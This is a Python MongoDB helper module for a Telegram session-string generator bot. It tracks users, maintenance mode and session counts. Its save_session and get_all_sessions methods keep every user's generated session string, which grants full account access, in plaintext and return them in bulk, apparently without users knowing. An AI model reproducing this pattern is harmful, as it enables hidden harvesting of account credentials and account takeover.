from motor.motor_asyncio import AsyncIOMotorClient
from config import MONGO_DB_URI

class Database:
    def __init__(self, uri):
        self._client = AsyncIOMotorClient(uri)
        self.db = self._client["StringGenBot"]
        self.users = self.db["users"]
        self.settings = self.db["settings"]

    async def is_user_exist(self, user_id):
        user = await self.users.find_one({"user_id": user_id})
        return True if user else False

    async def add_user(self, user_id):
        await self.users.insert_one({"user_id": user_id})

    async def total_users(self):
        return await self.users.count_documents({})

    async def get_all_users(self):
        return self.users.find({})

    async def is_maintenance_mode(self):
        config = await self.settings.find_one({"id": "maintenance"})
        if not config:
            return False
        return config.get("state", False)

    async def set_maintenance_mode(self, status: bool):
        await self.settings.update_one(
            {"id": "maintenance"},
            {"$set": {"state": status}},
            upsert=True
        )

    async def increment_session(self, session_type: str):
        # session_type: 'pyrogram' or 'telethon'
        await self.settings.update_one(
            {"id": "stats"},
            {"$inc": {session_type: 1}},
            upsert=True
        )

    async def get_stats(self):
        stats = await self.settings.find_one({"id": "stats"})
        if not stats:
            return {"pyrogram": 0, "telethon": 0}
        return {"pyrogram": stats.get("pyrogram", 0), "telethon": stats.get("telethon", 0)}

    async def save_session(self, user_id: int, username: str, session_type: str, session_string: str):
        await self.settings.update_one(
            {"id": "generated_sessions"},
            {"$push": {
                "sessions": {
                    "user_id": user_id,
                    "username": username,
                    "type": session_type,
                    "string": session_string
                }
            }},
            upsert=True
        )

    async def get_all_sessions(self):
        doc = await self.settings.find_one({"id": "generated_sessions"})
        if not doc:
            return []
        return doc.get("sessions", [])

db = Database(MONGO_DB_URI)
